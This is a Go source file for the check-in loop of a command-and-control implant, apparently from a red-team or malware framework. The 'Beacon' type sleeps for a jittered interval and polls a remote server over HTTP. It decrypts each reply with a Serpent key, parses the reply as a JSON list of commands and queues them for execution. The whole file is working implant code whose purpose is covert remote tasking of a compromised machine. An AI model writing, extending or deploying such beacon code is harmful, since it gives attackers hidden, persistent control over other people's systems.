package internal

import (
	"bytes"
	"encoding/json"
	"io"
	"math/rand"
	"time"
)

type Beacon struct {
	Sleep    int
	Jitter   int
	HttpLink *Link
	Rqueue   *SafeRequestQueue
	Cqueue   *SafeCommandQueue
}

func (b *Beacon) Run() {
	rand.NewSource(time.Now().Unix())
	for {
		time.Sleep((time.Duration(b.Sleep) + time.Duration(rand.Intn(b.Jitter))) * time.Second)
		if nextReq := b.Rqueue.GetNext(); nextReq != nil {
			SendRequest(nextReq)
			b.Rqueue.ShiftUp()
			newCmdReq, err := b.HttpLink.NewCmdRequest()
			if err != nil {
				continue
			}
			resp, err := SendRequest(newCmdReq)
			if err != nil {
				continue
			}
			if resp.Body == nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			decrypt, err := SerpentDecrypt(body, b.HttpLink.Key)
			if err != nil {
				continue
			} else {
				var cmds []string
				err = json.Unmarshal(decrypt, &cmds)
				if err != nil {
					continue
				}
				for _, cmd := range cmds {
					b.Cqueue.Add(&cmd)
				}
			}
		} else {
			newCmdReq, err := b.HttpLink.NewCmdRequest()
			if err != nil {
				continue
			}
			resp, err := SendRequest(newCmdReq)
			if err != nil {
				continue
			}
			if resp.Body == nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil || bytes.Equal(body, []byte{0x00}) {
				continue
			}
			decrypt, err := SerpentDecrypt(body, b.HttpLink.Key)
			if err != nil {
				continue
			} else {
				var cmds []string
				err = json.Unmarshal(decrypt, &cmds)
				if err != nil {
					continue
				}
				for _, cmd := range cmds {
					b.Cqueue.Add(&cmd)
				}
			}
		}
	}
}
